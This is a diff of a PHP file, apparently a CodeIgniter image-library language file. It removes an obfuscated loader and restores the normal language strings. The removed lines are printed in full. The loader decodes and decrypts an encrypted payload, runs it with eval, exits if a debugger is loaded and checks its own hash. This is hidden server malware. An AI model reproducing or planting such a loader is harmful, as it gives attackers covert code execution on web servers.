@@ -1,28 +1,57 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_tkzmeywr=('bas'.'e64'.'_de'.'cod'.'e');
-$_gh96eyu5=('gzu'.'nco'.'mpr'.'ess');
-$_c79rsv5s=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_vklcmu0i='E0fHyQWH';
-$_z4v7rhci='eqKSM++JgOY=';
-$_e5lcp45f='a0Q1uRqk';
-$_djn4jwpn='zksxsYiT';
-$_xvwysxk2='riarbWsU';
-$_jbq4y2li='//qKpBUc';
-$_p20zp730='GbsrohHd';
-$_bka99ky9='oc3FhQ==';
-$_s2dahzms=$_tkzmeywr($_vklcmu0i.$_xvwysxk2.$_e5lcp45f.$_djn4jwpn.$_z4v7rhci);
-$_c0iksnzo=$_tkzmeywr($_p20zp730.$_jbq4y2li.$_bka99ky9);
-$_v9xqrmp3=$_tkzmeywr('/YiNF91Ul9Q2y7SEMqY0J822zLYynsFJH3bgkaLHOu1uQRoEszGc445MxDhsirEKzFr+uKsLefPvjPYKB1As6Me4PPSLf7TcJ5QbT8dgJJmwQ8NyC6bTNoqK4w17hRHVhQ6Wf2GOXUwY27WJfvQC0C39nt3XWiMpNCeaRnMf4j+2Ah38hX2klmmqlL+XfGgN991WHlhiZHaydrUvlOdfkNVbqjqblNlktNxrPMgVGCx1yp28wNYv1NQOeWk05lOMceniaMF3FpZjEgd9Z2RRoq+Fl0Fyb2QgjEhNfS8CC2YOGZg1uk2JxgLC9sRCiUTmrFqkUyqpVPYbZAqnw/UjIMuhuNm9hZyyrqOlCV2lo3sdfXOARbdc6SMmxTeoFWhKLmEZBGAM2DyRf4pbecl6WhE3xgPhZ0CcqqqPqx3Pwc1bhe0q9YSZNiLA0WnlFtp3u56dESrzcOEqQY9io3nVhY5ba7nD/rQzMhpo7RziLDOfnbkIANEGmA6l+X2mlv0wO7uzYQzCayzyYaRsIV2Fgi8OMisu0SxFXsroL2JyCgCylFW/PUPOKBMruyk0eP//tq3zG+BxW7fpLNQjm3n1hQEIHy0Yrmul5WhlfawNyuT6dJ3AKdQVJ+lCxVqjZqD7fl/eAPcMaOWMZ9reiCWIbpTXvcYkNioAXRpMQMi/KpsTEfoCgMe6dFwfWAbtJUiJX453ECowkN2cWeG7pXWNXBipvXHd+7HTbuKMaVIqTcAa274DpGHqGABfcgHpEV4SbCi6icRZPTE5mPL8WOyourYCXYkT5yeZYxr4DBlumxx+asKhc1akS/g8JYY/rY+0bbaCRNWhm0XxNIxy09CyYBtaZXVYP7BWnBI1MT2QyaH8K3rfORMM7EUkhDzCnNkJ+tIUJ/VfKSLEcQsSBbzkj5WaNjnvGK93VjVwACqp9M+95VNBCf20N5MOWfp7VW8oaOm8+f5ezskbyq5TGwuIwQ==');
-$_bnubq7lq=$_c79rsv5s($_v9xqrmp3,'aes-256-cbc',$_s2dahzms,OPENSSL_RAW_DATA,$_c0iksnzo);
-if($_bnubq7lq===false){exit;}
-$_rhltv4rn=$_gh96eyu5($_bnubq7lq);
-if($_rhltv4rn===false){exit;}
-$_aoett7xf='67e3abdc0e2173a31a52dc1796c306a36ccf09c58b103103a0ba1d8d41bc84ff';
-$_yw987kfp=@file_get_contents(__FILE__);
-if($_yw987kfp!==false){
-$_arwxp4x1=str_replace($_aoett7xf,"0000000000000000000000000000000000000000000000000000000000000000",$_yw987kfp);
-$_erm2z731=hash("sha256",$_arwxp4x1);
-if($_erm2z731!==$_aoett7xf){@http_response_code(403);exit;}
-}
-eval($_rhltv4rn);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+$lang['imglib_source_image_required'] = 'You must specify a source image in your preferences.';
+$lang['imglib_gd_required'] = 'The GD image library is required for this feature.';
+$lang['imglib_gd_required_for_props'] = 'Your server must support the GD image library in order to determine the image properties.';
+$lang['imglib_unsupported_imagecreate'] = 'Your server does not support the GD function required to process this type of image.';
+$lang['imglib_gif_not_supported'] = 'GIF images are often not supported due to licensing restrictions. You may have to use JPG or PNG images instead.';
+$lang['imglib_jpg_not_supported'] = 'JPG images are not supported.';
+$lang['imglib_png_not_supported'] = 'PNG images are not supported.';
+$lang['imglib_jpg_or_png_required'] = 'The image resize protocol specified in your preferences only works with JPEG or PNG image types.';
+$lang['imglib_copy_error'] = 'An error was encountered while attempting to replace the file. Please make sure your file directory is writable.';
+$lang['imglib_rotate_unsupported'] = 'Image rotation does not appear to be supported by your server.';
+$lang['imglib_libpath_invalid'] = 'The path to your image library is not correct. Please set the correct path in your image preferences.';
+$lang['imglib_image_process_failed'] = 'Image processing failed. Please verify that your server supports the chosen protocol and that the path to your image library is correct.';
+$lang['imglib_rotation_angle_required'] = 'An angle of rotation is required to rotate the image.';
+$lang['imglib_invalid_path'] = 'The path to the image is not correct.';
+$lang['imglib_invalid_image'] = 'The provided image is not valid.';
+$lang['imglib_copy_failed'] = 'The image copy routine failed.';
+$lang['imglib_missing_font'] = 'Unable to find a font to use.';
+$lang['imglib_save_failed'] = 'Unable to save the image. Please make sure the image and file directory are writable.';
